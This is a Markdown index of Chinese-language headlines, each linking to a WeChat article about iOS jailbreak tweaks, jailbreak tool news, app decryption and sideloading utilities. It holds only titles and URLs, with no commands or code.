## iOS 系统，我的 iPhone 下雪啦，清凉

```
https://mp.weixin.qq.com/s/RvrDbrBdhT-Q_ut_ky-ZoQ
```

## iOS 系统，视频播放器手势，完全免费

```
https://mp.weixin.qq.com/s/MjA6oIQlPu54BJ7kaAvjIw
```

## iOS 系统，iPhone 来电自动应答，语音信箱

```
https://mp.weixin.qq.com/s/_kD65DEKCcCGtFh6WorJZw
```

## iOS 系统，给隐藏照片加锁，保护隐私

```
https://mp.weixin.qq.com/s/eDvNKbSDuvAuO8s3nhyrzQ
```

## iOS 系统，分屏神器，终于来了，完全免费

```
https://mp.weixin.qq.com/s/VxrfG_IMyJkOYxY9s7e5zA
```

## iOS 系统，自定义 Dock 栏摆放数量

```
https://mp.weixin.qq.com/s/h3b5_npq65eCjks5y5LfOw
```

## iOS 系统，翻译神器，详细使用

```
https://mp.weixin.qq.com/s/qZ0Gj64bHNqfNmZpocSyBQ
```

## iOS 15.4.1 越狱，Dopamine 将支持简体中文

```
https://mp.weixin.qq.com/s/8rVGhvCy3jwpN_c3Hiwksg
```

## iOS 系统，设置归类，设置顶图，就这么简单

```
https://mp.weixin.qq.com/s/7q4zS2mpFX2DRGxrjwqbaA
```

## iOS 系统，炫酷跑马灯，完全免费

```
https://mp.weixin.qq.com/s/xpwCCukt4O5VWP3cnXBixA
```

## iOS 系统，自定义文件夹，支持批量拖放，中文菜单

```
https://mp.weixin.qq.com/s/_4eThM51DYngTEjxcsKRUA
```

## iOS 系统，控制中心一键定位，一键注销，迷你播放器，免费

```
https://mp.weixin.qq.com/s/U9ahH9U06lYYYa3yMv8xEg
```

## iOS 系统，炫酷翻页特效，重生

```
https://mp.weixin.qq.com/s/WGF1iK9QmUJQRgVDoUqLyg
```

## 电池百分比，iOS 16 样式，完全免费

```
https://mp.weixin.qq.com/s/LoeQYWJCKRAov-DXZ7wLHA
```

## iOS 系统，砸壳，提取 IPA

```
https://mp.weixin.qq.com/s/POKnLnXEcaV_WeFRlkTSJg
```

## iOS 系统，接听振动，角标美化，状态栏日期和时间，完全免费

```
https://mp.weixin.qq.com/s/OUj0C7_-ssvjkJMXeTXPdQ
```

## 分享插件：55款插件一定有你喜欢的

```
https://mp.weixin.qq.com/s/VoZGTl5iwe98tlzrKThEfg
```

## iOS 系统，自定义锁头，漂亮

```
https://mp.weixin.qq.com/s/CWGHr0mO5YOcHvcPP0-DgA
```

## iOS 系统，真后台来了，完全免费

```
https://mp.weixin.qq.com/s/_O6ZMCZXneX56QzBosreug
```

## iOS 系统，终于来了，分词大爆炸，完全免费

```
https://mp.weixin.qq.com/s/dPqO2AgnIMbOFd7Bi46vOw
```

## iOS 系统，终于支持了，自定义桌面布局，完全免费

```
https://mp.weixin.qq.com/s/1X16PvIXr7I3sUCp4VhR7w
```

## iOS 系统，新一代截图神器，来了

```
https://mp.weixin.qq.com/s/DZZxAcw8lLvczs-8rUcBMQ
```

## iOS 系统，iPhone 熄屏显示，精美

```
https://mp.weixin.qq.com/s/QQgXWmQiGO5kCLsMkH1plw
```

## 美女更新，终于支持了

```
https://mp.weixin.qq.com/s/kPHfEvNLe85IuMZE3vP59g
```

## 大佬宣布离开，全部作品，完全免费

```
https://mp.weixin.qq.com/s/vgWr-J_Fy5z7ertnZ2ojNw
```

## iOS 系统，计算历史，角标，去除，勿扰增强，插件 Hub，完全免费

```
https://mp.weixin.qq.com/s/8HUs0mvFWZ5-ktek1YrxmA
```

## 仿 iPhone 12 充电动画来了，旧款设备也能实现

```
https://mp.weixin.qq.com/s/qQpviEqnfhXfL-1tyBneqQ
```

## iOS 13 仿 14 插件，越狱设备可试

```
https://mp.weixin.qq.com/s/gyoD4gOr3Iwn6vnOgHreIQ
```

## 收藏啦！iOS15.1XinaA15越狱，PC访问系统文件

```
https://mp.weixin.qq.com/s/FsM3Ul-3KaDunLQF__xQ8Q
```

## 真的来了，iOS 15/16 灵动半岛插件，确实有灵动

```
https://mp.weixin.qq.com/s/4S3-4qV4SopGeTwA7lCCpw
```

## 新工具疑似完美越狱 / 阿里云盘扩容 / 扫黑风暴惨遭泄漏

```
https://mp.weixin.qq.com/s/GwVnPIfZoeZVIRS0IKkufg
```

## 超爽！iOS 15.1 MilkyWay2 分屏，含安装教程

```
https://mp.weixin.qq.com/s/5dg5MCJ6QgVZnIU-4CL4Gg
```

## iOS14.8.1系统越狱新解锁，戴耳机也能解锁设备

```
https://mp.weixin.qq.com/s/rTLe1KdfRQiZ54SaH4G8Hw
```

## iOS 系统，漂亮锁屏，别具一格

```
https://mp.weixin.qq.com/s/lewysejGGbpwA87h0TTG5w
```
## iOS 系统，功能丰富，必备神器，完全免费

```
https://mp.weixin.qq.com/s/p0nLRsMwnku0oxJen3XprA
```

## 05.05 ｜ 近期插件更新，速看

```
https://mp.weixin.qq.com/s/AwNF8CjL2HmxH_dQ5-RJ7A
```

## iOS 16.2 AppSync 插件更新，可以任意安装IPA

```
https://mp.weixin.qq.com/s/szIA7ASYdH0VWrRjeQV7xw
```

## iOS 系统，让 iPhone 使用 tvOS 精美弹窗

```
https://mp.weixin.qq.com/s/RXv3JAiom4K1rnK3W_U8MA
```

## iOS 系统，一键抠图神器，无需升级 iOS 16

```
https://mp.weixin.qq.com/s/VadXLLO9iBKMnUN507VHxQ
```

## iOS 系统，漂亮的计时器和闹钟，现已免费

```
https://mp.weixin.qq.com/s/oyFHcmKanTsznQho6UNMfQ
```

## iOS 系统，iPhone 通话变声器

```
https://mp.weixin.qq.com/s/yFlqh8mhRNi2QWZ1F40X1Q
```

## iOS 系统，照片加锁，保护隐私，现已免费

```
https://mp.weixin.qq.com/s/9eSKpU4UcaC8MTn-RhyAlA
```

## iOS 系统，卡片计算器，前端悬浮显示

```
https://mp.weixin.qq.com/s/i_N7eFDM1f-uZIqZpOSfEg
```

## iOS 系统，像 iPad 一样分屏，终于来了，免费

```
https://mp.weixin.qq.com/s/gew66tNDWV0fQXxKBb-vmg
```

## 注意！iOS 15.0-15.1.1 电池容量可改，小心被骗

```
https://mp.weixin.qq.com/s/1jf8kFYwAq_Iasn8mL-7NQ
```

## iOS 系统，键盘增强，完全免费

```
https://mp.weixin.qq.com/s/Fh4nLBx5xXG7qBADVCoOKw
```

## iOS 系统，一键清除后台，两款，完全免费

```
https://mp.weixin.qq.com/s/buF4WXfLffbQXRBgwIEQ2w
```

## iOS 系统，iPhone 熄屏显示，炫酷

```
https://mp.weixin.qq.com/s/a52lAZOAU_0eUZussSil4A
```

## iOS 系统，轻量级剪贴板神器，完全免费

```
https://mp.weixin.qq.com/s/WZ6zOGvSO5JvCBxh1tGqEQ
```

## iOS 系统，iPhone 分屏神器，现已免费

```
https://mp.weixin.qq.com/s/3aokPB-iMBQ-18QlBzLksg
```

## iOS 系统，动画加速，纵享丝滑

```
https://mp.weixin.qq.com/s/j7Mr4tD4e_wjbyCUWg8KMQ
```

## iOS 系统，快速启动神器，丝滑

```
https://mp.weixin.qq.com/s/9HmfhMYfq_0KNNl1ct2t9A
```

## iOS 系统，超酷动态视频壁纸，完全免费

```
https://mp.weixin.qq.com/s/LdtVlkrCD7-NBBQ7qW-IsA
```

## iOS 系统，运行时间，一键截图，锁屏天气，完全免费

```
https://mp.weixin.qq.com/s/5P8bmTSbnkChQF3F3uJePQ
```

## iOS 系统，功能强大，保护隐私

```
https://mp.weixin.qq.com/s/I8yXnoW5gY0908uOUgFVYw
```

## iOS 系统，简洁好用的程序锁，免费

```
https://mp.weixin.qq.com/s/7atDcp31oCJZZVDgnhFtBg
```

## iOS 系统，去除红点，去除资源库，录屏勿扰，复制通知，图标文件夹

```
https://mp.weixin.qq.com/s/KecTqxZ-Unabb6ARu3toBQ
```

## iOS 系统，让 iPhone 快速返回，非常方便

```
https://mp.weixin.qq.com/s/m-UVmt0uggHyD7I6_8TYxA
```

## iOS 13 双网秒变全网通方法，电信卡终于支持

```
https://mp.weixin.qq.com/s/FGDCsm5Po8j1MNRa2Aj8EQ
```

## iOS 系统，带上皇冠，终于来了

```
https://mp.weixin.qq.com/s/jUTM2lVhOSLWBdr1HiMQQQ
```

## iOS 系统，Dopamine 越狱，官方源作者源推荐（一）

```
https://mp.weixin.qq.com/s/9IVsWkRaCcfrnSr4Ebupxw
```

## 二个越狱消息：新版Cydia将来出炉/IOS11.3.1平刷插件

```
https://mp.weixin.qq.com/s/2hmmLyQaSpupc9D9PYsmRQ
```

## IOS11.2~11.3.1系统美化软件已发布，你会喜欢吗？

```
https://mp.weixin.qq.com/s/FabYhz1LNwgic41A13kQdA
```


## iOS 系统，deb 备份，支持一键备份全部

```
https://mp.weixin.qq.com/s/r6KxWQsuSBh72w6b4X21Sg
```

## iOS 系统，通知归纳，简洁美观

```
https://mp.weixin.qq.com/s/Jc7ou0mo4yB5_SMiXOw6KA
```

## iOS 系统，一键振动，禁用资源库，自定义运营商，自动解锁，完全免费

```
https://mp.weixin.qq.com/s/PbTZM37HmOShWP7QS7_B9g
```

## iOS12.4 越狱工具无法安装？绕过 ID 新方法

```
https://mp.weixin.qq.com/s/3AqUY1R0hVxWYxScBlfNwA
```

## iOS 13.4.1 免越狱改X手势，Sileo 再次更新

```
https://mp.weixin.qq.com/s/qYrfrFd-kE5hRtr0thIdUg
```

## DolphiniOS 模拟器已发布，掉签问题已修复

```
https://mp.weixin.qq.com/s/Htif1DpuPwTPOxHQYYaMnw
```

## iPhone 上玩真的 PSP 游戏，支持 iOS 13 系统

```
https://mp.weixin.qq.com/s/Shwv4N4lWlTVvDxGBrW23g
```

## iOS 16.1.2 DirtyCow 已发布，可以实现一键替换

```
https://mp.weixin.qq.com/s/MOrmpFG0SA8k62d0m9rQCA
```

## iOS 系统，全新全局手势神器，完全免费

```
https://mp.weixin.qq.com/s/O6Dug7Cj3tT5I1d_hICaeA
```

## Scarlet，猩红，自签安装 IPA 文件，完全免费

```
https://mp.weixin.qq.com/s/4Nt6K5KkkZr4247RlbQZog
```


## iOS 系统，已安装插件，提取和备份 deb

```
https://mp.weixin.qq.com/s/vQpyIPIyGY80DOJ2KOe1fg
```

## iOS 系统，砸壳，提取 IPA，支持中文

```
https://mp.weixin.qq.com/s/UfiM2Z346_KtRcQSk9HJZw
```

## iOS 15.4.1 Derootifier 更新，转无根插件

```
https://mp.weixin.qq.com/s/WpSy6G7vIYFWS0PmbhDXgQ
```

## iOS 系统，控制中心换个图标，有趣

```
https://mp.weixin.qq.com/s/nKzvEM2fIscdp0Wdlqprug
```

## iOS 16.5 系统，SimpleKFD 工具箱，一键监督，一键灵动岛

```
https://mp.weixin.qq.com/s/BxN8UzhyzcBC7oF59z5P0Q
```

## iOS 系统，新的 iPhone 分屏神器，众享丝滑

```
https://mp.weixin.qq.com/s/MeqS0proFrb5CHZ1LrNWAw
```

## 好东西，iOS 14 制作永久版应用，仅需几秒搞定

```
https://mp.weixin.qq.com/s/L-vudctVvu99yqcDEqXKXg
```

## 好东西，iOS 16.1.2 Files 文件管理器，确实有效

```
https://mp.weixin.qq.com/s/yGbrTzI_NejCerf0KrJeKQ
```

## 牛批！iOS 16.5 修改角标已发布，可改颜色

```
https://mp.weixin.qq.com/s/seEwRkgkCC77_PaICdqrlg
```
